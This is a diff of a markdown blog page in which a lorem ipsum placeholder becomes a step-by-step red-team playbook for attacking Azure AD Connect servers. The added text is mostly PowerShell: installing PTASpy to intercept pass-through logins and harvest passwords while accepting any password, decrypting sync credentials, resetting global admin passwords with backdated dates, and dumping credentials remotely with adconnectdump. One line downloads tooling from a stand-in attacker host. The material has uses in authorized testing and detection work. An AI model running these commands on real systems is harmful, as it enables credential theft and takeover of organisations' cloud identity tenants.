@@ -7,16 +7,211 @@ publishedAt: 2023-10-1
 category: 'Hybrid'
 ---
 
-## Heading 2
+## Overview
 
-Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Eget gravida cum sociis natoque penatibus et magnis dis. Posuere morbi leo urna molestie at elementum eu facilisis sed. Lectus nulla at volutpat diam. Pharetra magna ac placerat vestibulum lectus. Turpis massa tincidunt dui ut ornare lectus sit amet. Pretium vulputate sapien nec sagittis. Mollis nunc sed id semper. Odio pellentesque diam volutpat commodo sed egestas. Mi sit amet mauris commodo quis. Ullamcorper morbi tincidunt ornare massa. Mi proin sed libero enim sed faucibus turpis. Eu consequat ac felis donec et. Ultricies integer quis auctor elit. Aliquam sem et tortor consequat id porta nibh.
+Methodology for attacking AD Connect servers in Hybrid AD environments.
 
-![image](https://unsplash.it/400/300)
+### Resources 
 
-Mi sit amet mauris commodo quis imperdiet massa. Cras tincidunt lobortis feugiat vivamus at augue. Lobortis feugiat vivamus at augue. Vulputate mi sit amet mauris. Congue mauris rhoncus aenean vel elit. Ut morbi tincidunt augue interdum velit euismod in. Viverra justo nec ultrices dui sapien eget. Magna fringilla urna porttitor rhoncus. Nulla posuere sollicitudin aliquam ultrices sagittis orci a scelerisque purus. Cum sociis natoque penatibus et magnis dis parturient montes nascetur. Sapien faucibus et molestie ac. Maecenas pharetra convallis posuere morbi leo urna. Mauris nunc congue nisi vitae suscipit tellus mauris a.
+##### Escalate from Local Admin
+https://aadinternals.com/post/on-prem_admin/
 
-Commodo nulla facilisi nullam vehicula ipsum a arcu cursus. Enim tortor at auctor urna nunc id cursus. Mattis enim ut tellus elementum sagittis vitae et leo duis. Sed libero enim sed faucibus turpis in eu mi bibendum. Turpis massa tincidunt dui ut ornare. Eu sem integer vitae justo. Feugiat nibh sed pulvinar proin. Sagittis nisl rhoncus mattis rhoncus urna neque. Aenean et tortor at risus viverra adipiscing at in. Sed ullamcorper morbi tincidunt ornare massa. Lorem ipsum dolor sit amet consectetur. Tellus in hac habitasse platea dictumst vestibulum rhoncus est. Bibendum arcu vitae elementum curabitur vitae nunc sed. In egestas erat imperdiet sed euismod nisi. Tellus at urna condimentum mattis pellentesque. Urna condimentum mattis pellentesque id nibh tortor id aliquet lectus. Pellentesque sit amet porttitor eget dolor morbi non arcu risus.
+##### AADInternals Docs
+https://aadinternals.com/aadinternals/
 
-Dui ut ornare lectus sit amet est. Cursus turpis massa tincidunt dui ut. Vulputate ut pharetra sit amet aliquam id diam maecenas ultricies. Suspendisse interdum consectetur libero id faucibus nisl tincidunt eget nullam. Arcu bibendum at varius vel pharetra vel turpis nunc eget. Vivamus at augue eget arcu. Ultrices mi tempus imperdiet nulla malesuada pellentesque elit eget. Eget nullam non nisi est sit amet facilisis magna. Pellentesque elit eget gravida cum sociis. Tempus iaculis urna id volutpat lacus laoreet non curabitur gravida. Aliquam etiam erat velit scelerisque in dictum non. Quam viverra orci sagittis eu volutpat odio. Gravida dictum fusce ut placerat orci nulla pellentesque dignissim enim.
+##### Dump ADConnect creds like secretsdump 
+https://github.com/fox-it/adconnectdump
 
-Nisl nunc mi ipsum faucibus vitae. Congue eu consequat ac felis donec et odio pellentesque. Sit amet purus gravida quis blandit turpis. In dictum non consectetur a. Nibh cras pulvinar mattis nunc sed blandit libero. Pellentesque habitant morbi tristique senectus et netus et malesuada. Amet tellus cras adipiscing enim eu. Adipiscing bibendum est ultricies integer quis auctor elit. Augue lacus viverra vitae congue eu. Faucibus et molestie ac feugiat sed lectus vestibulum. At risus viverra adipiscing at in tellus. Tincidunt vitae semper quis lectus. Ultrices dui sapien eget mi. Ligula ullamcorper malesuada proin libero nunc consequat interdum varius sit. Quisque id diam vel quam elementum pulvinar etiam non quam. Sed viverra tellus in hac habitasse platea dictumst vestibulum. Massa id neque aliquam vestibulum morbi. Purus viverra accumsan in nisl nisi.
+##### In-depth on what adconnectdump is doing behind the scenes
+https://dirkjanm.io/updating-adconnectdump-a-journey-into-dpapi/
+
+##### In-Depth - Azure AD Connect for Red Teamerr
+https://blog.xpnsec.com/azuread-connect-for-redteam/
+
+##### In-depth - HybridIdentity Administrator / Service account - Attack and Detection 
+https://github.com/Cloud-Architekt/AzureAD-Attack-Defense/blob/main/AADCSyncServiceAccount.md#suspicious-activities-from-azure-ad-connector-account
+
+##### Exploiting Azure AD PTA vulns
+https://aadinternals.com/post/pta/
+
+##### Azure Red Team lab 
+https://improsec.com/tech-blog/read2own
+
+##### PTA Dumping
+https://imphash.medium.com/shooting-up-on-prem-to-cloud-detecting-aadconnect-creds-dump-422b21128729
+
+
+Goal is to get local admin rights on the AD Connect server 
+
+### Attacker - Get AADInternals 
+```powershell
+Install-Module AADInternals 
+Import-Module AADInternals 
+```
+
+### Attacker - Get RSAT Tools
+```powershell
+Enable-WindowsOptionalFeature -Online -FeatureName RSAT-AD-PowerShell
+```
+
+### Attacker - Get ADConnectDump
+```powershell
+iwr https://github.com/fox-it/adconnectdump/archive/refs/heads/master.zip -o
+adconnectdump.zip; Expand-Archive .\adconnectdump.zip
+```
+
+### Attacker - Finding ADConnect Account 
+```powershell
+Get-AADIntAccessTokenForAADIAMAPI -SaveToCache
+Get-AADIntAADConnectStatus
+```
+
+### Attacker - Check Domain Properties of MSOL_* user and ADSync to find Server
+```powershell
+Get-AdUser -Filter * -Properties * | Where {$_.DisplayName -like 'MSOL*'} 
+Get-AdUser -Filter * -Properties * | Where {$_.DisplayName -like 'ADSync*'} 
+```
+
+
+## Scenario 1 - PassThroughAuthentication - AD to AzAD Escalation
+
+### Requirements:
+Local Admin rights on the server running the ADConnect agent 
+OR 
+M365 Global Admin creds 
+
+### AADInternals -  AADIntPTASpy - MITM the PtA traffic from the agent 
+Summary: Every logon against AzAd on domain gets redirected to PTA agent on-prem. PTA checks with DC if password is valid for an account. If valid, Agent reaches out to AzureAD TO REQUEST ACCESS. 
+
+### AADInternals - Bring over Tools
+```powershell
+$url = "https://github.com/Gerenios/AADInternals/archive/refs/heads/master.zip"
+# $url = "https://attacker.legit.com:8000/AADInternals-master.zip"
+```
+
+### AADInternals - Install
+```powershell
+iwr $url -o aadint.zip; Expand-Archive .\aadint.zip
+Import-Module .\AADInternals.psd1
+```
+
+### AADInternals - Start MITM of PTA 
+```powershell
+Install-AADIntPTASPY 
+```
+
+### AADInternals - Check decoded passwords left in C:\PTASpy\PTASpy.csv 
+```powershell
+Get-AADIntPTASpylog -DecodePasswords 
+```
+
+### AADInternals - Clean up CSV 
+```powershell
+Remove-Item -r -force C:\PTASpy
+```
+
+### AADInternals - Remove PTASpy
+```powershell
+Remove-AADIntPTASpy
+```
+
+## AADInternals - Log in as any user 
+Every PTA attempt against Azure AD will be intercepted by the installed AADIntPTASpy module. The module will record the user’s password attempt and reply back to Azure AD on behalf of the PTA Agent. This reply advises Azure AD the password attempt was valid and grants the user access to the cloud, even if the password is incorrect. If an attacker has implanted AADIntPTASpy, they can log in as any user that attempts to authenticate using PTA—and will be granted access. 
+
+## AADInternals - Perpetual Harvest as Glocal Cloud Admin 
+If you have global admin, we can install the PTA agent on one of our own servers and register it as PTA Agent in the portal and continue recieve logins
+
+
+
+## Scenario 2 - PasswordHashSync - AD to AzAd Escalation
+
+### AADInternals - Decrypt DPAPI master keys and Sync Creds 
+```powershell
+Get-AADIntSyncCredentials 
+```
+
+### AADInternals - Modifying Users-  Save the displayed credentials to a variable
+```powershell
+$creds = Get-Credential 
+```
+
+### AADInternals - Get Tokena and Save to Cache
+```powershell
+Get-AADIntAccessTokenForAADGraph -Credentials $creds -SaveToCache
+```
+
+### AADInternals - Get Users
+```powershell
+Get-AADIntUsers | Select UserPrincipalName,ImmutableId,ObjectId | Sort UserPrincipalName
+```
+
+### AADInternals - Users with immutable IDs are hybrid users and can be modified if we know their SourceAnchor
+```powershell
+Set-AADIntAzureADObject -SourceAnchor "UQ989+t6fEq9/0ogYtt1pA==" -displayName "I've been hacked!"
+```
+
+### AADInternals - Change a users password, change date to anything we want, no password policy enforced here
+```powershell
+Set-AADIntUserPassword -SourceAnchor "UQ989+t6fEq9/0ogYtt1pA==" -Password "NewPwd" -ChangeDate (Get-Date).AddYears(-1)
+```
+
+### AADInternals - If result 0, we're successful. Then list GAs
+```powershell
+Get-AADIntGlobalAdmins
+```
+
+### AADInternals - If Global Admin is a hybrid user with a SourceAnchor we can change the password the same way
+### We can also change cloud admins by speciifying CloudAnchor
+```powershell
+Set-AADIntUserPassword -CloudAnchor "User_7b0ad665-a751-43d7-bb9a-7b8b1e6b1c59" -Password "NewPwd" -ChangeDate (Get-Date).AddYears(-1)
+```
+
+### Note - PHS
+Password reset works only if the Password Hash Synchronisation (PHS) is enabled. Luckily, AAD Connect service account can turn it on. The following command just sets the PHS switch in Azure AD, it doesn’t start the actual PHS sync.
+
+### Enable PHS
+```powershell
+Set-AADIntPasswordHashSyncEnabled -Enabled $true
+```
+
+
+
+## Scenario 3 - ADConnectDump.py - Remote Dump over Network
+
+### Requirements: From Windows, Python2.7 Impacket, 
+```powershell
+adconnectdump.py, ADSyncQuery.exe
+```
+
+###  Python2 - Install Python2.7
+```powershell
+cinst -y python2
+C:\Python27\python.exe -m pip install impacket pycryptodomex
+```
+
+### ADConnectDump - Download tool
+```powershell
+git clone https://github.com/fox-it/adconnectdump
+cd adconnectdump
+```
+
+### ADConnectDump - Get MSSQL localDb for Dump
+```powershell
+Invoke-WebRequest -Uri https://go.microsoft.com/fwlink/?LinkID=866658 -OutFile SqlLocalDB.msi
+Start-Process -FilePath msiexec.exe -ArgumentList '/i', 'SqlLocalDB.msi', '/qn' -Wait
+Remove-Item -Path SqlLocalDB.msi
+```
+
+### ADConnectDump - Dump Creds with secretsdump style syntax
+```powershell
+$ServerName = "192.168.0.238" 
+$password = "Password"
+$username = "administrator"
+$domain = "Shrine"
+ C:\Python27\python.exe .\adconnectdump.py -dc-ip $ServerName -target-ip $ServerName Administrator@$ServerName
+```
+
+### Notes
+You should call adconnectdump.py from Windows. It will dump the Azure AD connect credentials over the network similar to secretsdump.py (you also will need to have impacket and pycryptodomex installed to run this). ADSyncQuery.exe should be in the same directory as it will be used to parse the database that is downloaded (this requires MSSQL LocalDB installed on your host).
+
+Alternatively you can run the tool on any OS, wait for it to download the DB and error out, then copy the mdf and ldf files to your Windows machine with MSSQL, run ADSyncQuery.exe c:\absolute\path\to\ADSync.mdf > out.txt and use this out.txt on your the system which can reach the Azure AD connect host with --existing-db and --from-file out.txt to do the rest.
